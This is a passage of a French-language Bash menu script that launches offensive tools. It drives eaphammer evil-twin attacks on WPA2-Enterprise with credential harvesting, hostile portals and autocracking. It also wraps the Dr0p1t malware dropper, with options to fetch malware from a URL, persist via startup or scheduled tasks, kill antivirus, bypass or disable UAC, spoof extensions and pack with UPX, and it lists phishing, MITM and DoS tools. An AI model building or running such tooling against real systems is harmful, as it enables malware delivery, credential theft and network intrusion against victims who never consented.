				if [[ "$EAPHINTAUTO" = "OFF" && "$EAPHAIRCRACK" = "OFF" ]]
				then
					if [[ "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="OFF"
					fi
				fi
				echo -e ""$YS" 1"$CE") Créer un nouveau certificat RADIUS pour votre Point d'Accès (PA)"
				echo -e ""$YS" 2"$CE") Définir l'interface pour votre PA                                        ACTUEL: $EAPHIFACE"
				echo -e ""$YS" 3"$CE") Spécifier le point d'accès ESSID                                         ACTUEL: $EAPHESSID"
				echo -e ""$YS" 4"$CE") Spécifier le point d'accès BSSID                                         ACTUEL: $EAPHBSSID"
				echo -e ""$YS" 5"$CE") Spécifier le point d'accès channel                                       ACTUEL: $EAPHCHANNEL"
				echo -e ""$YS" 6"$CE") Spécifier le type de WPA                                                 ACTUEL: $EAPHWPA"
				echo -e ""$YS" 7"$CE") Spécifier le type d'authentification                                     ACTUEL: $EAPHAUTH"
				echo -e ""$YS" 8"$CE") Récolte des crédits EAP                                                  ACTUEL: $EAPHCREDS"
				echo -e ""$YS" 9"$CE") Forcer les clients à se connecter au portail hostile                     ACTUEL: $EAPHHOSTILE"
				echo -e ""$YS"10"$CE") Forcer les clients à se connecter au portail captif                      ACTUEL: $EAPHCAPTIVE"
				echo -e ""$YS"11"$CE") Effectuer un pivot sans fil indirect                                     ACTUEL: $EAPHPIVOT"
				echo -e ""$YS"12"$CE") Activer karma                                                            ACTUEL: $EAPHKARMA"
				echo -e ""$YS"13"$CE") Utiliser autocrack/ajouter avec une plate-forme de crackage à distance   ACTUEL: $EAPHAIRCRACK"
				echo -e ""$YS"14"$CE") Utiliser l'autocrack interne                                             ACTUEL: $EAPHINTAUTO"
				echo -e ""$YS"15"$CE") Spécifier la wordlist pour l'autocrack                                   ACTUEL: $EAPHWORD"
				echo -e ""$YS"start"$CE") Lancer "
				echo -e ""$YS"00"$CE") Menu principal"
				echo -e ""$YS" back"$CE") Retour"
				echo -e "Choix: "
				read EAPH
				clear
				if [[ "$EAPH" = 1 ]]
				then
					cd /root/eaphammer
					./eaphammer --cert-wizard
				elif [[ "$EAPH" = 2 ]]
				then
					echo -e "Entrer l'interface que vous voulez utiliser: "
					read EAPHIFACE
				elif [[ "$EAPH" = 3 ]]
				then
					echo -e "Entrer le ESSID: "
					read EAPHESSID
				elif [[ "$EAPH" = 4 ]]
				then
					echo -e "Entrer le BSSID: "
					read EAPHBSSID
				elif [[ "$EAPH" = 5 ]]
				then
					echo -e "Entrer la channel: "
					read EAPHCHANNEL
				elif [[ "$EAPH" = 6 ]]
				then
					if [[ "$EAPHWPA" = 1 ]]
					then
						EAPHWPA=2
					else
						EAPHWPA=1
					fi
				elif [[ "$EAPH" = 7 ]]
				then
					echo -e ""$YS" 1"$CE") Ouvrir"
					echo -e ""$YS" 2"$CE") ttls"
					echo -e ""$YS" 3"$CE") peap"
					echo -e "Choose: "
					read PAUTH
					if [[ "$PAUTH" = 1 ]]
					then
						EAPHAUTH="open"
					elif [[ "$PAUTH" = 2 ]]
					then
						EAPHAUTH="ttls"
					elif [[ "$PAUTH" = 3 ]]
					then
						EAPHAUTH="peap"
					fi
				elif [[ "$EAPH" = 8 ]]
				then
					if [[ "$EAPHCREDS" = "OFF" ]]
					then
						EAPHCREDS="ON"
					else
						EAPHCREDS="OFF"
					fi
				elif [[ "$EAPH" = 9 ]]
				then
					if [[ "$EAPHHOSTILE" = "OFF" ]]
					then
						EAPHHOSTILE="ON"
					else
						EAPHHOSTILE="OFF"
					fi
				elif [[ "$EAPH" = 10 ]]
				then
					if [[ "$EAPHCAPTIVE" = "OFF" ]]
					then
						EAPHCAPTIVE="ON"
					else
						EAPHCAPTIVE="OFF"
					fi
				elif [[ "$EAPH" = 11 ]]
				then
					if [[ "$EAPHPIVOT" = "OFF" ]]
					then
						EAPHPIVOT="ON"
					else
						EAPHPIVOT="OFF"
					fi
				elif [[ "$EAPH" = 12 ]]
				then
					if [[ "$EAPHKARMA" = "OFF" ]]
					then
						EAPHKARMA="ON"
					else
						EAPHKARMA="OFF"
					fi
				elif [[ "$EAPH" = 13 ]]
				then
					if [[ "$EAPHAIRCRACK" = "OFF" ]]
					then
						clear
						echo -e "Hostname: "
						read HOSTN
						echo -e "Port: "
						read PORT
						clear
						EAPHAIRCRACK=""$HOSTN":"$PORT""
					else
						EAPHAIRCRACK="OFF"
					fi
				elif [[ "$EAPH" = 14 ]]
				then
					if [[ "$EAPHINTAUTO" = "OFF" ]]
					then
						EAPHINTAUTO="ON"
					else
						EAPHINTAUTO="OFF"
					fi
				elif [[ "$EAPH" = 15 ]]
				then
					if [[ "$EAPHWORD" != "OFF" && "$EAPHWORD" != "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="OFF"
					else
						clear
						echo -e "Entrer le chemin complet de la wordlist: "
						read EAPHWORD
					fi
				elif [[ "$EAPH" = "back" || "$EAPH" = "b" ]]
				then
					clear
					break
				elif [[ "$EAPH" = "00" ]]
				then
					clear
					exec bash $0
				elif [[ "$EAPH" = "0" ]]
				then
					clear
					exit
				elif [[ "$EAPH" = "start" ]]
				then
					clear
					if [[ "$OK1" != 1 ]]
					then
						echo -e "Vous n'avez pas spécifié les exigences importantes"
						sleep 4
						continue
					fi
					if [[ "$OK2" != 1 ]]
					then
						echo -e "Vous n'avez pas spécifié la wordlist pour l'autocrack"
						sleep 4
						continue
					fi
				if [[ "$EAPHCREDS" = "ON" ]]
				then
					CREDS="--creds"
				else
					CREDS=""
				fi
				if [[ "$EAPHHOSTILE" = "ON" ]]
				then
					HOSTILE="--hostile-portal"
				else
					HOSTILE=""
				fi
				if [[ "$EAPHCAPTIVE" = "ON" ]]
				then
					CAPTIVE="--captive-portal"
				else
					CAPTIVE=""
				fi
				if [[ "$EAPHPIVOT" = "ON" ]]
				then
					PIVOT="--pivot"
				else
					PIVOT=""
				fi
				if [[ "$EAPHKARMA" = "ON" ]]
				then
					KARMA="--karma"
				else
					KARMA=""
				fi
				if [[ "$EAPHINTAUTO" = "ON" ]]
				then
					INTAUTO="--local-autocrack"
				else
					INTAUTO=""
				fi
				if [[ "$EAPHAIRCRACK" != "OFF" ]]
				then
					AIRCRACK="--remote-autocrack $EAPHAIRCRACK"
				else
					AIRCRACK=""
				fi
				if [[ "$EAPHAIRCRACK" != "OFF" || "$EAPHINTAUTO" != "OFF" ]]
				then
					WORD="--wordlist $EAPHWORD"
				else
					WORD=""
				fi
				IFACE="-i $EAPHIFACE"
				CHANNEL="-c $EAPHCHANNEL"
				ESSID="-e $EAPHESSID"
				BSSID="-b $EAPHBSSID"
				WPA="--wpa $EAPHWPA"
				AUTH="--auth $EAPHAUTH"
					cd /root/eaphammer
					./eaphammer $IFACE $CHANNEL $BSSID $ESSID $WPA $AUTH $PIVOT $KARMA $INTAUTO $CAPTIVE $HOSTILE $CREDS $AIRCRACK $WORD
					
				fi
			done
}
function dropit_automation
{
clear
while true
do
	clear
	TERMINALTITLE="Dr0p1t-Framework"
	dash_calc
	printf '\033]2;Dr0p1t-Framework\a'
	if [[ "$MALURL" = "" ]]
	then
		MALURL="\e[1;31mNONE\e[0m"
	fi
	if [[ "$STARTUP" = "" ]]
	then
		STARTUP="OFF"
	fi
	if [[ "$TASK" = "" ]]
	then
		TASK="OFF"
	fi
	if [[ "$LTPUP" = "" ]]
	then
		LTPUP="OFF"
	fi
	if [[ "$KILLANT" = "" ]]
	then
		KILLANT="OFF"
	fi
	if [[ "$RUNBAT" = "" ]]
	then
		RUNBAT="OFF"
	fi
	if [[ "$RUNPOW" = "" ]]
	then
		RUNPOW="OFF"
	fi
	if [[ "$RUNVBS" = "" ]]
	then
		RUNVBS="OFF"
	fi
	if [[ "$UACASADMIN" = "" ]]
	then
		UACASADMIN="OFF"
	fi
	if [[ "$SPOOFEXT" = "" ]]
	then
		SPOOFEXT="OFF"
	fi
	if [[ "$ISZIP" = "" ]]
	then
		ISZIP="OFF"
	fi
	if [[ "$COMPRESS" = "" ]]
	then
		COMPRESS="OFF"
	fi
	if [[ "$DISUAC" = "" ]]
	then
		DISUAC="OFF"
	fi
	if [[ "$ICON" = "" ]]
	then
		ICON="OFF"
	fi
	if [[ "$EVENT" = "" ]]
	then
		EVENT="OFF"
	fi
	if [[ "$COMPILE" = "" ]]
	then
		COMPILE="OFF"
	fi
	if [[ "$D32" = "" ]]
	then
		D32="OFF"
	fi
	if [[ "$D64" = "" ]]
	then
		D64="OFF"
	fi
	if [[ "$BANN" = "" ]]
	then
		BANN="OFF"
	fi
	echo -e ""$YS" 1"$CE") URL du Malware                                    ACTUEL:$MALURL"
	echo -e ""$YS" 2"$CE") Malware au démarrage                              ACTUEL:$STARTUP"
	echo -e ""$YS" 3"$CE") Malware vers le planificateur de tache            ACTUEL:$TASK"
	echo -e ""$YS" 4"$CE") Add link to powershell user profile               ACTUEL:$LTPUP"
	echo -e ""$YS" 5"$CE") Kill l'antivirus avant le  malware                ACTUEL:$KILLANT"
	echo -e ""$YS" 6"$CE") Lancer le script batch avant le malware           ACTUEL:$RUNBAT"
	echo -e ""$YS" 7"$CE") Lancer le script powershell avant le malware      ACTUEL:$RUNPOW"
	echo -e ""$YS" 8"$CE") Lancer le script vbs avant le malware             ACTUEL:$RUNVBS"
	echo -e ""$YS" 9"$CE") Bypass UAC et lancer le malware en admin          ACTUEL:$UACASADMIN"
	echo -e ""$YS"10"$CE") Usurpation du fichier final vers une extension    ACTUEL:$SPOOFEXT"
	echo -e ""$YS"11"$CE") Malware compréssé en zip                          ACTUEL:$ISZIP"
	echo -e ""$YS"12"$CE") Compresser le fichier final avec UPX              ACTUEL:$COMPRESS"
	echo -e ""$YS"13"$CE") Essayer de désactiver UAC sur l'appareil victime  ACTUEL:$DISUAC"
	echo -e ""$YS"14"$CE") Utiliser une icone dans le fichier final          ACTUEL:$ICON"
	echo -e ""$YS"15"$CE") Ne pas clean les log de la cible                  ACTUEL:$EVENT"
	echo -e ""$YS"16"$CE") Ne pas compiler le fichier final                  ACTUEL:$COMPILE"
	echo -e ""$YS"17"$CE") Télécharger le malware en 32 bit seulement        ACTUEL:$D32"
	echo -e ""$YS"18"$CE") Télécharger le malware en 64 bit seulement        ACTUEL:$D64"
	echo -e ""$YS"19"$CE") Rester discret(pas de bannière)                   ACTUEL:$BANN"
	echo -e ""$YS" o"$CE") Ouvrir le dossier de sortie"
	echo -e ""$YS" u"$CE") Voir les mises à jour"
	echo -e ""$YS" b"$CE") Retour"
	echo -e ""$YS"start"$CE") Générer"
	echo -e "Choix: "
	read DR
	clear
	if [[ "$DR" = "o" ]]
	then
		gio open /root/Dr0p1t-Framework/output
		continue
	fi
	if [[ "$DR" = "u" ]]
	then
		cd /root/Dr0p1t-Framework
		python Dr0p1t.py -u
		cd
		continue
	fi
	if [[ "$DR" = "start" ]]
	then
		if [[ "$MALURL" = "\e[1;31mNONE\e[0m" ]]
		then
			echo -e ""$RS"Aucun URL spécifié."$CE""
			sleep 2
			continue
		fi
		if [[ "$STARTUP" = "OFF" ]]
		then
			DSTARTUP=""
		else
			DSTARTUP="-s"
		fi
		if [[ "$TASK" = "OFF" ]]
		then
			DTASK=""
		else
			DTASK="-t"
		fi
		if [[ "$LTPUP" = "OFF" ]]
		then
			DLTPUP=""
		else
			DLTPUP="-a"
		fi
		if [[ "$KILLANT" = "OFF" ]]
		then
			DKILLANT=""
		else
			DKILLANT="-k"
		fi
		if [[ "$RUNBAT" = "OFF" ]]
		then
			DRUNBAT=""
		else
			DRUNBAT="-b $RUNBAT"
		fi
		if [[ "$RUNPOW" = "OFF" ]]
		then
			DRUNPOW=""
		else
			DRUNPOW="-p $RUNPOW"
		fi
		if [[ "$RUNVBS" = "OFF" ]]
		then
			DRUNVBS=""
		else
			DRUNVBS="-v $RUNVBS"
		fi
		if [[ "$UACASADMIN" = "OFF" ]]
		then
			DUACASADMIN=""
		else
			DUACASADMIN="--runas"
		fi
		if [[ "$SPOOFEXT" = "OFF" ]]
		then
			DSPOOFEXT=""
		else
			DSPOOFEXT="--spoof $SPOOFEXT"
		fi
		if [[ "$ISZIP" = "OFF" ]]
		then
			DISZIP=""
		else
			DISZIP="--zip"
		fi
		if [[ "$COMPRESS" = "OFF" ]]
		then
			DCOMPRESS=""
		else
			DCOMPRESS="--upx"
		fi
		if [[ "$DISUAC" = "OFF" ]]
		then
			DDISUAC=""
		else
			DDISIAC="--nouac"
		fi
		if [[ "$ICON" = "OFF" ]]
		then
			DICON=""
		else
			DICON="-i $ICON"
		fi
		if [[ "$EVENT" = "OFF" ]]
		then
			DEVENT=""
		else
			DEVENT="--noclearevent"
		fi
		if [[ "$COMPILE" = "OFF" ]]
		then
			DCOMPILE=""
		else
			DCOMPILE="--nocompile"
		fi
		if [[ "$D32" = "OFF" ]]
		then
			DD32=""
		else
			DD32="--only32"
		fi
		if [[ "$D64" = "OFF" ]]
		then
			DD64=""
		else
			DD64="--only64"
		fi
		if [[ "$BANN" = "OFF" ]]
		then
			DBANN=""
		else
			DBANN="-q"
		fi
		cd /root/Dr0p1t-Framework
		python Dr0p1t.py $MALURL $DSTARTUP $DTASK $DLTPUP $DKILLANT $DRUNBAT $DRUNPOW $DRUNVBS $DUACASADMIN $DSPOOFEXT $DISZIP $DCOMPRESS $DDISUAC $DICON $DEVENT $DCOMPILE $DD32 $DD64 $DBANN
		echo -e "$PAKTGB"
		$READAK
		cd
	elif [[ "$DR" = 1 ]]
	then
		echo -e "Malware URL: "
		read MALURL
	elif [[ "$DR" = 14 ]]
	then
		if [[ "$ICON" = "OFF" ]]
		then
			while true
			do
				echo -e ""$RS"L'icône doit être dans le dossier /root/Dr0p1t-Framework/icons ."$CE""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/icons/
				echo -e ""
				echo -e ""$YS"cp"$CE") Copier mon icône dans le dossier"
				echo -e ""$YS" b"$CE") Retour"
				echo -e "Entrer le nom de votre icône: "
				read ICON
				if [[ "$ICON" = "b" ]]
				then
					ICON="OFF"
					break
				elif [[ "$ICON" = "m" ]]
				then
					clear
					echo -e "Le chemin de votre fichier: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e ""$RS"Le fichier n'existe pas."$CE""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/icons/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/icons/"$ICON" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/icons/"$ICON".ico ]]
					then
						echo -e ""$RS"Aucun fichier trouvé."$CE""
						sleep 2
					else
						ICON=""$ICON".ico"
						break
					fi
				else
					break
				fi
			done
		else
			ICON="OFF"
		fi
	elif [[ "$DR" = 8 ]]
	then
		if [[ "$RUNVBS" = "OFF" ]]
		then
			while true
			do
				echo -e ""$RS"Le script doit être dans le dossier /root/Dr0p1t-Framework/scripts/vbs ."$CE""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/scripts/vbs/
				echo -e ""
				echo -e ""$YS"cp"$CE") Copier mon script dans le dossier"
				echo -e ""$YS" b"$CE") Retour"
				echo -e "Entrer le nom de votre dossier: "
				read RUNVBS
				if [[ "$RUNVBS" = "b" ]]
				then
					RUNVBS="OFF"
					break
				elif [[ "$RUNVBS" = "m" ]]
				then
					clear
					echo -e "Le chemin de votre fichier: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e ""$RS"Le fichier n'existe pas."$CE""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/scripts/vbs/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/scripts/vbs/"$RUNVBS" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/scripts/vbs/"$RUNVBS".vbs ]]
					then
						echo -e ""$RS"Aucun fichier trouvé."$CE""
						sleep 2
					else
						RUNVBS=""$RUNVBS".vbs"
						break
					fi
				else
					break
				fi
			done
		else
			RUNVBS="OFF"
		fi
	elif [[ "$DR" = 7 ]]
	then
		if [[ "$RUNPOW" = "OFF" ]]
		then
			while true
			do
				echo -e ""$RS"Le script doit être dans le dossier /root/Dr0p1t-Framework/scripts/powershell ."$CE""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/scripts/powershell/
				echo -e ""
				echo -e ""$YS"cp"$CE") Copier mon script dans le dossier"
				echo -e ""$YS" b"$CE") Retour"
				echo -e "Entrer le nom de votre dossier: "
				read RUNPOW
				if [[ "$RUNPOW" = "b" ]]
				then
					RUNPOW="OFF"
					break
				elif [[ "$RUNPOW" = "m" ]]
				then
					clear
					echo -e "Le chemin de votre fichier: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e ""$RS"Le fichier n'existe pas."$CE""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/scripts/powershell/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/scripts/powershell/"$RUNPOW" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/scripts/powershell/"$RUNPOW".ps1 ]]
					then
						echo -e ""$RS"Aucun fichier trouvé."$CE""
						sleep 2
					else
						RUNPOW=""$RUNPOW".ps1"
						break
					fi
				else
					break
				fi
			done
		else
			RUNPOW="OFF"
		fi
	elif [[ "$DR" = 6 ]]
	then
		if [[ "$RUNBAT" = "OFF" ]]
		then
			while true
			do
				echo -e ""$RS"Le script doit être dans le dossier /root/Dr0p1t-Framework/scripts/bat ."$CE""
				echo -e ""
				ls -1 /root/Dr0p1t-Framework/scripts/bat/
				echo -e ""
				echo -e ""$YS"cp"$CE") Copier mon script dans le dossier"
				echo -e ""$YS" b"$CE") Retour"
				echo -e "Entrer le nom de votre dossier: "
				read RUNBAT
				if [[ "$RUNBAT" = "b" ]]
				then
					RUNBAT="OFF"
					break
				elif [[ "$RUNBAT" = "m" ]]
				then
					clear
					echo -e "Le chemin de votre fichier: "
					read FP
					if [[ ! -f "$FP" ]]
					then
						echo -e ""$RS"Le fichier n'existe pas."$CE""
						sleep 2
					else
						cp "$FP" /root/Dr0p1t-Framework/scripts/bat/
					fi
				elif [[ ! -f /root/Dr0p1t-Framework/scripts/bat/"$RUNBAT" ]]
				then
					if [[ ! -f /root/Dr0p1t-Framework/scripts/bat/"$RUNBAT".bat ]]
					then
						echo -e ""$RS"Aucun fichier trouvé."$CE""
						sleep 2
					else
						RUNBAT=""$RUNBAT".bat"
						break
					fi
				else
					break
				fi
			done
		else
			RUNBAT="OFF"
		fi
	elif [[ "$DR" = 2 ]]
	then
		if [[ "$STARTUP" = "OFF" ]]
		then
			STARTUP="ON"
		else
			STARTUP="OFF"
		fi
	elif [[ "$DR" = 3 ]]
	then
		if [[ "$TASK" = "OFF" ]]
		then
			TASK="ON"
		else
			TASK="OFF"
		fi
	elif [[ "$DR" = 4 ]]
	then
		if [[ "$LTPUP" = "OFF" ]]
		then
			LTPUP="ON"
		else
			LTPUP="OFF"
		fi
	elif [[ "$DR" = 5 ]]
	then
		if [[ "$KILLANT" = "OFF" ]]
		then
			KILLANT="ON"
		else
			KILLANT="OFF"
		fi
	elif [[ "$DR" = 9 ]]
	then
		if [[ "$UACASADMIN" = "OFF" ]]
		then
			UACASADMIN="ON"
		else
			UACASADMIN="OFF"
		fi
	elif [[ "$DR" = 10 ]]
	then
		if [[ "$SPOOFEXT" = "OFF" ]]
		then
			echo -e "Extension: "
			read SPOOFEXT
		else
			SPOOFEXT="OFF"
		fi
	elif [[ "$DR" = 11 ]]
	then
		if [[ "$ISZIP" = "OFF" ]]
		then
			ISZIP="ON"
		else
			ISZIP="OFF"
		fi
	elif [[ "$DR" = 12 ]]
	then
		if [[ "$COMPRESS" = "OFF" ]]
		then
			COMPRESS="ON"
		else
			COMPRESS="OFF"
		fi
	elif [[ "$DR" = 13 ]]
	then
		if [[ "$DISUAC" = "OFF" ]]
		then
			DISUAC="ON"
		else
			DISUAC="OFF"
		fi
	elif [[ "$DR" = 15 ]]
	then
		if [[ "$EVENT" = "OFF" ]]
		then
			EVENT="ON"
		else
			EVENT="OFF"
		fi
	elif [[ "$DR" = 16 ]]
	then
		if [[ "$COMPILE" = "OFF" ]]
		then
			COMPILE="ON"
		else
			COMPILE="OFF"
		fi
	elif [[ "$DR" = 17 ]]
	then
		if [[ "$D32" = "OFF" ]]
		then
			D32="ON"
		else
			D32="OFF"
		fi
	elif [[ "$DR" = 18 ]]
	then
		if [[ "$D64" = "OFF" ]]
		then
			D64="ON"
		else
			D64="OFF"
		fi
	elif [[ "$DR" = 19 ]]
	then
		if [[ "$BANN" = "OFF" ]]
		then
			BANN="ON"
		else
			BANN="OFF"
		fi
	fi
done
}
function wifi_tools
{
	while true
	do
	printf '\033]2;WIFI TOOLS\a'
	clear
	TERMINALTITLE="WIFI TOOLS"
	dash_calc
	if [[ -d /root/fluxion ]]
	then
		echo -e ""$YS" 1"$CE") Fluxion               Le futur des attaques MITM WPA"
	else
		echo -e ""$RS" 1"$CE") "$RS"Fluxion"$CE"               Le futur des attaques MITM WPA"
	fi
	if [[ $(which wifite) ]]
	then
		echo -e ""$YS" 2"$CE") Wifite                Outil d'attaque Wifi automatique"
	else
		echo -e ""$RS" 2"$CE") "$RS"Wifite"$CE"               Outil d'attaque Wifi automatique"
	fi
	if [[ -d /root/wifiphisher ]]
	then
		echo -e ""$YS" 3"$CE") Wifiphisher           Attaques de phising automatique contre les clients Wifi"
	else
		echo -e ""$RS" 3"$CE") "$RS"Wifiphisher"$CE"           Attaques de phising automatique contre les clients Wifi"
	fi
	if [[ -d /root/Zatacker ]]
	then
		echo -e ""$YS" 4"$CE") Zatacker              MITM-NMAP-Mail Spammer..(A installer automatiquement)"
	else
		echo -e ""$RS" 4"$CE") "$RS"Zatacker"$CE"              MITM-NMAP-Mail Spammer..(A installer automatiquement)"
	fi
	if [[ -d /root/morpheus ]]
	then
		echo -e ""$YS" 5"$CE") Morpheus              Outil de piratage Ettercap TCP/IP automatique"
	else
		echo -e ""$RS" 5"$CE") "$RS"Morpheus"$CE"              Outil de piratage Ettercap TCP/IP automatique"
	fi
	#~ if [[ -d /root/osrframework ]]
	#~ then
		#~ echo -e ""$YS" 6"$CE") Osrfconsole           Checks usernames-phones to platforms etc.."
	#~ else
		#~ echo -e ""$RS" 6"$CE") "$RS"Osrfconsole"$CE"           Checks usernames-phones to platforms etc.."
	#~ fi
	if [[ -d /root/opensource ]]
	then
		echo -e ""$YS" 6"$CE") Netool-toolkit        MitM pentesting opensource toolkit"
	else
		echo -e ""$RS" 6"$CE") "$RS"Netool-toolkit"$CE"        MitM pentesting opensource toolkit"
	fi
	if [[ -d /root/hakkuframework ]]
	then
		echo -e ""$YS" 7"$CE") Hakku                 Outils de test de pénétration"
	else
		echo -e ""$RS" 7"$CE") "$RS"Hakku"$CE"                 Outils de test de pénétration"
	fi
	if [[ -d /root/Trity ]]
	then
		echo -e ""$YS" 8"$CE") Trity                 Advanced pentesting framework"
	else
		echo -e ""$RS" 8"$CE") "$RS"Trity"$CE"                 Advanced pentesting framework"
	fi
	if [[ -d /root/Dracnmap ]]
	then				
		echo -e ""$YS" 9"$CE") Dracnmap              Nombreuses options de scan"
	else
		echo -e ""$RS" 9"$CE") "$RS"Dracnmap"$CE"              Nombreuses options de scan"
	fi
	if [[ -d "/usr/share/fern-wifi-cracker" ]]
	then	
		echo -e ""$YS"10"$CE") Fern                  Wifi cracker GUI"
	else
		echo -e ""$RS"10"$CE") "$RS"Fern"$CE"                  Wifi cracker GUI"
	fi
	if [[ -f /usr/sbin/netdiscover ]]
	then	
		echo -e ""$YS"11"$CE") Netdiscover           Outil de découverte d'adresse réseau"
	else
		echo -e ""$RS"11"$CE") "$RS"Netdiscover"$CE"           Outil de découverte d'adresse réseau"
	fi
	if [[ -d /root/kickthemout ]]
	then	
		echo -e ""$YS"12"$CE") KickThemOut           Kicker les appareils de votre réseau"
	else
		echo -e ""$RS"12"$CE") "$RS"KickThemOut"$CE"           Kicker les appareils de votre réseau"
	fi
	if [[ -d "/usr/share/ghost-phisher" ]]
	then	
		echo -e ""$YS"13"$CE") Ghost-Phisher         Faux point d'accès,MITM,détournement de session etc..."
	else
		echo -e ""$RS"13"$CE") "$RS"Ghost-Phisher"$CE"         Faux point d'accès,MITM,détournement de session etc..."
	fi
	if [[ -d /root/The-Eye ]]
	then	
		echo -e ""$YS"14"$CE") The Eye               Detects ARP poisoning DNS spoofing etc..."
	else
		echo -e ""$RS"14"$CE") "$RS"The Eye"$CE"               Detects ARP poisoning DNS spoofing etc..."
	fi
	if [[ -d /root/xerxes ]]
	then	
		echo -e ""$YS"15"$CE") Xerxes                Le plus puissant outil DoS(CAUTION)"
	else
		echo -e ""$RS"15"$CE") "$RS"Xerxes"$CE"                Le plus puissant outil DoS(CAUTION)"
	fi
	if [[ -d /root/KatanaFramework ]]
	then
		echo -e ""$YS"16"$CE") Katana Framework      Nombreuses fonctionnalités de test de pénétration"
	else
		echo -e ""$RS"16"$CE") "$RS"Katana Framework"$CE"      Nombreuses fonctionnalités de test de pénétration"
	fi
	if [[ -d /root/airgeddon ]]
	then
		echo -e ""$YS"17"$CE") Airgeddon             Audit des réseaux sans fil."
	else
		echo -e ""$RS"17"$CE") "$RS"Airgeddon"$CE"             Audit des réseaux sans fil."
	fi
	if [[ -f /usr/bin/websploit ]]
	then
		echo -e ""$YS"18"$CE") Websploit             Advanced MITM framework"
	else
		echo -e ""$RS"18"$CE") "$RS"Websploit"$CE"             Advanced MITM framework"
	fi
	if [[ -d /etc/openvas ]]
	then
		echo -e ""$YS"19"$CE") Openvas               Scanner de vulnérabilité LAN"
	else
		echo -e ""$RS"19"$CE") "$RS"Openvas"$CE"               Scanner de vulnérabilité LAN"
	fi
	if [[ -f /usr/bin/ipscan ]]
	then
		echo -e ""$YS"20"$CE") Angry IP Scanner      IP Scanner"
	else
		echo -e ""$RS"20"$CE") "$RS"Angry IP Scanner"$CE"      IP Scanner"
	fi
	if [[ -d /root/routersploit ]]
	then
		echo -e ""$YS"21"$CE") Routersploit          Chercher/exploiter les vulnurabilités du routeur"
	else
		echo -e ""$RS"21"$CE") "$RS"Routersploit"$CE"          Chercher/exploiter les vulnurabilités du routeur"
	fi
	if [[ -d /root/nWatch ]]
	then
		echo -e ""$YS"22"$CE") nWatch                IP scanner/OS detection"
	else
		echo -e ""$RS"22"$CE") "$RS"nWatch"$CE"                IP scanner/OS detection"
	fi
	if [[ -d /root/eternal_scanner ]]
	then
		echo -e ""$YS"23"$CE") Eternal scanner       Scanner les vulnérabilités d'eternalblue pour les hôtes"
	else
		echo -e ""$RS"23"$CE") "$RS"Eternal scanner"$CE"       Scanner les vulnérabilités d'eternalblue pour les hôtes"
	fi
	if [[ -d /root/eaphammer ]]
	then
		echo -e ""$YS"24"$CE") Eaphammer             Attaques jumelles Evil contre les réseaux WPA2-Enterprise"
	else
		echo -e ""$RS"24"$CE") "$RS"Eaphammer"$CE"             Attaques jumelles Evil contre les réseaux WPA2-Enterprise"
	fi
	if [[ -d /root/VMR ]]
	then
		echo -e ""$YS"25"$CE") VMR                   Meilleur WPS cracker, mdk3-v6"
	else
		echo -e ""$RS"25"$CE") "$RS"VMR"$CE"                   Meilleur WPS cracker, mdk3-v6"
	fi
	if [[ -d /root/netattack2 ]]
	then
		echo -e ""$YS"26"$CE") Netattack3            Scan avancée du réseau et script d'attaque"
	else
		echo -e ""$RS"26"$CE") "$RS"Netattack2"$CE"            Scan avancée du réseau et script d'attaque"
	fi
	if [[ -f /usr/bin/wifi-pumpkin ]]
	then
		echo -e ""$YS"27"$CE") Wifi-Pumpkin          Framework pour l'attaque points d'accès Wi-Fi escrocs"
	else
		echo -e ""$RS"27"$CE") "$RS"Wifi-Pumpkin"$CE"          Framework pour l'attaque points d'accès Wi-Fi escrocs"
	fi
	if [[ -d /root/Gloom-Framework ]]
	then
		echo -e ""$YS"28"$CE") Gloom                 Framework de test de pénétration"
	else
		echo -e ""$RS"28"$CE") "$RS"Gloom"$CE"                 Framework de test de pénétration"
	fi
	if [[ -f /usr/bin/sechub ]]
	then
		echo -e ""$YS"29"$CE") secHub                Kit de Sécurité/Hacking"
